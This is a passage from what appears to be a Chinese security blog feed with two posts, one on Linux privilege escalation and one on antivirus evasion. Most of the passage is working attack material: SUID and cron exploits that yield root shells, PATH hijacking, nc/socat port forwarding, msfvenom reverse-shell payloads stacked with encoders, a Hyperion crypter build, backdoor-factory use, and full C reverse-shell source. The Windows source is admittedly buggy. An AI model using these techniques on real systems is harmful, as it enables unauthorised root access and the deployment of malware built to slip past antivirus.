alt=""></p><p><strong>3、man</strong></p><blockquote><p>sudo man man</p></blockquote><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164826.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429164919.png" alt=""></p><blockquote></blockquote><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><blockquote><p>ls -l /etc/cron*</p></blockquote><p>非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出，并且默认这些程序以 root 权限执行 </p><p><strong>重写 python</strong></p><p>若这些计划任务的脚本可写，则编辑为 shell</p><p>crontab 文件是计划任务的配置，此文件只有 root 可写，我们不需要去修改 crontab，只查看里面的有哪些任务，比如定时执行了哪些脚本，再查看对应脚本的权限，若可写，则修改它。</p><p>测试：</p><blockquote><p>cat /etc/crontab</p></blockquote><p><img src="QQ%E6%88%AA%E5%9B%BE20200429165555.png" alt=""></p><p>我没有设置定时任务，模拟一下，如果里面有个 <code>1.python</code></p><blockquote><p>ls -al /tmp/1.py //查看是否有w权限 </p><p>cat -al /tmp/1.py //写入代码  import os os.system(‘cp /bin/sh /tmp/sh’) os.system(‘chmod u+s /tmp/sh’) </p></blockquote><p>当到了计划执行时间，就会以 root 权限执行 1.py，即将 /bin/sh 复制到 /tmp/sh</p><p>原本是没有 /tmp/sh</p><p>当执行 <code>sudo python 1.py</code> 时，就会复制到 /tmp/sh </p><p>我们只需要进入 /tmp，执行 ./sh 可获取 root</p><p>这里的 cp 命令是基于 SUID，给 1.py 设置 SUID 权限。可以结合环境变量方式，把 /tmp/sh 添加到环境变量，无需进入 /tmp/sh 去执行 ./sh，执行 sh 变为 root。也可以在 1.py 写入反弹 shell 的 python 代码，此时反弹的 shell 具有 root 权限</p><p><strong>防范：</strong> </p><p>crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p><h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>​    SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行,ls 查看时有 s 属性才支持 SUID。比如passwd命令，就是以root权限运行来修改shadow的。</p><p>​    suid提权：</p><p>​    利用拥有suid的文件执行命令，从而提升权限至root</p><h5 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h5><p>常见可用来提权的linux可行性的文件列表如下：</p><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><p>查找系统上运行的所有SUID可执行文件：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="builtin-name">find</span> / -user root -perm -4000 -<span class="builtin-name">print</span> 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">2. <span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">3. <span class="builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200429145451.png" alt=""></p><h5 id="例NMAP"><a href="#例NMAP" class="headerlink" title="例NMAP"></a>例NMAP</h5><p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p><p>交互模式可以通过执行Nmap参数” interactive “</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure><p>以下命令将提供一个提升的shell。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !<span class="keyword">sh</span></span><br><span class="line"><span class="keyword">sh-3.2# </span>whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure><h5 id="例Find"><a href="#例Find" class="headerlink" title="例Find"></a>例Find</h5><p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">touch</span> <span class="string">pentestlab</span></span><br><span class="line"><span class="attr">find</span> <span class="string">pentestlab -exec whoami \;</span></span><br></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch getflag</span><br><span class="line"><span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"whoami"</span> \;</span><br><span class="line"><span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br></pre></td></tr></table></figure><h5 id="例VIM"><a href="#例VIM" class="headerlink" title="例VIM"></a>例VIM</h5><p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny <span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"><span class="comment"># Press ESC key</span></span><br><span class="line">:set <span class="keyword">shell</span><span class="bash">=/bin/sh</span></span><br><span class="line">:<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><h5 id="例Bash"><a href="#例Bash" class="headerlink" title="例Bash"></a>例Bash</h5><p>以下命令将以root权限打开一个bash shell.</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line"><span class="attribute">uid</span>=1002(service) <span class="attribute">gid</span>=1002(service) <span class="attribute">euid</span>=0(root) <span class="attribute">groups</span>=1002(serv</span><br></pre></td></tr></table></figure><h5 id="例Less"><a href="#例Less" class="headerlink" title="例Less"></a>例Less</h5><p>Less和More都执行以用来提权。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less <span class="regexp">/etc/</span>passwd</span><br><span class="line">!<span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure><h4 id="环境变量劫持-SUID-扩展"><a href="#环境变量劫持-SUID-扩展" class="headerlink" title="环境变量劫持-SUID 扩展"></a>环境变量劫持-SUID 扩展</h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p><p>linux 下执行命令，如 cat，是去环境变量查找 ,将 cat 替换</p><p><strong>测试：</strong></p><p>把新建一个 /tmp/cat，而 cat 内容为我们脚本，当用户执行 cat 命令，cat /etc/shadow，则执行我们的脚本 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; <span class="regexp">/tmp/</span>ls &lt;&lt;EOF  </span><br><span class="line"><span class="meta">#!/usr/bin/python  </span></span><br><span class="line">print <span class="string">"this is not the true cat"</span>  </span><br><span class="line">print <span class="string">"here is a root shell!"</span>  </span><br><span class="line"><span class="keyword">import</span> pty;pty.spawn(<span class="string">"/bin/sh"</span>)  </span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>此时再执行 ./suid-exp，可执行我们定义的脚本，因为 suid-exp 以管理员执行 cat 命令，而 linux 的 system 是根据环境变量来执行 cat 的，原本是默认的 cat，当修改了之后，cat 就不再是原来的 cat，而是我们自己定义的脚本，从而达到执行任意命令的目的，即可去提权。</p><h4 id="docker-组提权"><a href="#docker-组提权" class="headerlink" title="docker 组提权"></a>docker 组提权</h4><p>docker组用户提权，目的是利用docker组的用户来提权，因为docker组用户在容器下为root权限，通过挂载方式在容器下给本机添加sudo权限的用户，从而可以利用sudo命令。如果没有拥有sudo权限的用户，是无法执行sudo命令，在kali下会提示用户不在sudoers等提示。 </p><p>可以参考这篇文章：  《Docker提权实战测试》  <a href="https://www.secquan.org/Discuss/1070515" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070515</a></p><h4 id="服务漏洞"><a href="#服务漏洞" class="headerlink" title="服务漏洞"></a>服务漏洞</h4><blockquote><p>netstat -antup #查看各种网络服务 </p></blockquote><p>然后把敏感端口转发出来，用本地的工具进行攻击，可能拿到远程 root，即通过漏洞拿到 root 权限 windows 用 lcx 做端口转发，linux 用 nc、socat 做端口转发</p><p><strong>1、redis 反弹 shell</strong></p><p>nc 单向转发</p><blockquote><p>nc -l 12345 | nc 192.168.191.170 80</p></blockquote><p>双向转发</p><blockquote><p>mkfifo backpipe nc -l 12345 0&lt;backpipe | nc 192.168.191.170 80 1&gt;backpipe </p></blockquote><p>双向转发本人测试失败，希望大佬们提供解决的办法</p><p>socat</p><p>测试本地转发，service apache2 start，把 80 端口转发到其它端口，看是否能访问，这里测试成功 </p><blockquote><p>socat TCP-LISTEN:8080,fork TCP:192.168.191.170:80 </p></blockquote><p>这里可以参考这篇文章，作者先执行 ps -fu root，发现开放 redis 端口，把 redis 端口转发出来，利用 redis 反弹远程的 root shell。一次简单 linux 提权:</p><blockquote><p><a href="https://www.secquan.org/Discuss/1069715#reply8" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1069715#reply8</a></p></blockquote><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/system/129549.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/129549.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1544037</a></p><p><a href="https://www.xmsec.cc/guide-linux-privilege-escalation/" target="_blank" rel="noopener">https://www.xmsec.cc/guide-linux-privilege-escalation/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;linux提权方法综述&quot;&gt;&lt;a href=&quot;#linux提权方法综述&quot; class=&quot;headerlink&quot; title=&quot;linux提权方法综述&quot;&gt;&lt;/a&gt;linux提权方法综述&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="linux提权" scheme="https://shu1l.github.io/tags/linux%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试之免杀入门</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/</id>
    <published>2020-04-28T13:18:46.000Z</published>
    <updated>2020-05-17T11:07:53.691Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试——免杀部分知识"><a href="#渗透测试——免杀部分知识" class="headerlink" title="渗透测试——免杀部分知识"></a>渗透测试——免杀部分知识</h2><h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1.恶意软件"></a>1.恶意软件</h4><ul><li>病毒、木马、蠕虫、键盘激励、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装<ul><li>处于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击……</li></ul></li></ul><h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2.防病毒软件"></a>2.防病毒软件</h4><ul><li>恶意程序最主要的防护手段<ul><li>杀毒软件/防病毒软件</li><li>客户端/服务器/邮件防病毒</li></ul></li><li>检测原理<ul><li>基于二进制文件中特征签名的黑名单检测方法</li><li>基于行为的分析方法（启发式）</li></ul></li><li>事后手段<ul><li>永远落后于病毒发展</li></ul></li></ul><h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3.免杀技术"></a>3.免杀技术</h4><ul><li>修改二进制文件中的特征字符<ul><li>替换、擦除、修改</li></ul></li><li>加密技术（crypter）<ul><li>通过加密是的特征字符不可读，从而逃避AV 检测</li><li>运行时分片分段的解密执行，注入进程或 AV 不检查的无害文件中</li></ul></li><li>防病毒软件的检测<ul><li>恶意程序本身的特征字符</li><li>加密器 cripter 的特征字符</li></ul></li></ul><h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4.当前现状"></a>4.当前现状</h4><ul><li>恶意软件制造者<ul><li>编写私有的 RAT 软件，避免普遍被 AV 所知的特征字符</li><li>使用独有 crypter 软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li><li>Fully UnDetectable 还最高追求 （FUD）</li></ul></li><li>AV 厂商<ul><li>广泛采集样本，尽快发现出现的病毒程序，更新病毒库</li><li>一般新的恶意软件安全 UD 窗口期是一周左右</li><li>乐毅软件制造者永无休止的拉锯战</li><li>信的启发式检测技术尚有待完善(误杀漏杀)</li></ul></li><li>单一 AV 厂商的病毒库很难达到 100% 覆盖<ul><li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul><li>接口被某些国家的AV软禁免费利用，没有自己的病毒库</li></ul></li><li><a href="http://www.virscan.org/" target="_blank" rel="noopener">http://www.virscan.org/</a></li><li>在线多引擎查杀网站与 AV 查杀共享信息</li><li>搞黑的在线多引擎查毒站<ul><li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li><li><a href="http://viruscheckmate.com/check/" target="_blank" rel="noopener">http://viruscheckmate.com/check/</a></li></ul></li><li>常用的 RAT 软件<ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul></li></ul></li></ul><h4 id="5-生成病毒程序"><a href="#5-生成病毒程序" class="headerlink" title="5.生成病毒程序"></a>5.生成病毒程序</h4><h5 id="1-生成程序"><a href="#1-生成程序" class="headerlink" title="1.生成程序"></a>1.生成程序</h5><ul><li>生成反弹 shell</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -a x86 --platform win -f exe -o a.exe</span><br></pre></td></tr></table></figure><ul><li>加密编码反弹 shell</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell/bind_tcp <span class="attribute">lhost</span>=10.10.10.132 <span class="attribute">lport</span>=4444 -f<span class="built_in"> raw </span>-e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f<span class="built_in"> raw </span>| msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b <span class="string">'\x00'</span> -f exe -o b.exe</span><br></pre></td></tr></table></figure><ul><li>比较编码前后的检测率</li></ul><h5 id="2-隐藏shell"><a href="#2-隐藏shell" class="headerlink" title="2.隐藏shell"></a>2.隐藏shell</h5><ul><li>利用模板隐藏 shell</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -a x86 --platform win -f exe -o c.exe</span><br></pre></td></tr></table></figure><ul><li>多重编码</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -e x86/shikata_ga_nai -i <span class="number">5</span> -a x86 --platform win -f exe &gt; d.exe</span><br></pre></td></tr></table></figure><ul><li>比较编码前后的检测率</li></ul><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul><li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li><li>常被恶意软件用于免杀目的</li><li>Hyperion （32bit PE 程序加密器）</li><li>Crypter / Container（解密器 PE Loader ）</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># unzip Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成加密器</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成木马程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对木马程序进行加密</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine h.exe p.exe x.exe</span></span><br></pre></td></tr></table></figure><ul><li>比较编码前后的检测率</li></ul><h4 id="7-自己编写后门"><a href="#7-自己编写后门" class="headerlink" title="7.自己编写后门"></a>7.自己编写后门</h4><ul><li>Windows reverse shell</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine gcc.exe windows.c -o windows.exe -lws2_32</span></span><br></pre></td></tr></table></figure><ul><li>Linux shellg’c’c</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># gcc linux_revers_shell.c -o linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -nvlp 333</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ./linux 127.0.0.1 333</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8%5C20190413174142304.png" alt="在这里插入图片描述"></p><ul><li>linux_revers_shell.c</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: 192.168.153.166 4444\n"</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sock.sin_family  = AF_INET;</span><br><span class="line">sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">dup2(s,<span class="number">0</span>);</span><br><span class="line">dup2(s,<span class="number">1</span>);</span><br><span class="line">dup2(s,<span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>windows.c</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOOKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"><span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"><span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line"><span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">hax.sin_family = AF_INET;</span><br><span class="line">hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure><p><img src="20190413174154985.png" alt="在这里插入图片描述"></p><h4 id="后门工具–Backdoor-factory"><a href="#后门工具–Backdoor-factory" class="headerlink" title="后门工具–Backdoor-factory"></a>后门工具–Backdoor-factory</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>patch<ul><li>通过替换 exe、dll、注册表等方法修复系统漏洞或问题的方法</li><li>bdf：向二进制文件中增加或者删除代码内容<ul><li>某些受保护的二进制程序无法 patch</li><li>存在一定概率问价你会被 patch 坏掉</li></ul></li></ul></li><li>后门工厂<ul><li>使用于 windows PE x32/64 和 linux ELF x32/64 （OSX）</li><li>支持 msf payload、自定义 payload</li></ul></li><li>将 shellcode 代码 patch 进模板文件，躲避 AV 检查</li><li>python 语言编写</li><li>msf 使用的 patch 方法<ul><li>覆盖程序入口<ul><li>msfvenom -p windows/shell/reverse_tcp</li></ul></li><li>创建新的线程执行 shellcode 并跳回原程序入口<ul><li>msfvenom -p windows/shell/reverse_tcp –k</li><li>增加代码片段跳转执行后跳回源程序入口</li></ul></li></ul></li><li>CTP 方法<ul><li>增加新的代码段 session，与 smf 的-k 方法类似</li><li>使用现有的代码裂缝/洞（code cave）存放 shellcode</li></ul></li><li>代码洞<ul><li>二进制中超过两个字节的连续 x00 区域（代码片段间区域）</li><li>根据统计判断代码洞是编译在进行编译是造成的，不同的编译器造成的代码洞的大小不同</li></ul></li><li>单个代码洞代销不足以存放完整的 shellcode<ul><li>多代码洞跳转（非顺序执行）<ul><li>初期免杀率可达100%</li></ul></li><li>结合 msf 的 stager 方法</li></ul></li><li>patch 选项<ul><li>附加代码段</li><li>单代码洞注入</li><li>多代码注入</li></ul></li><li>BDF 基本使用<ul><li>检查二进制文件是否支持代码注入<ul><li>backdoor-factory -f putty.exe –S</li></ul></li><li>显示可用 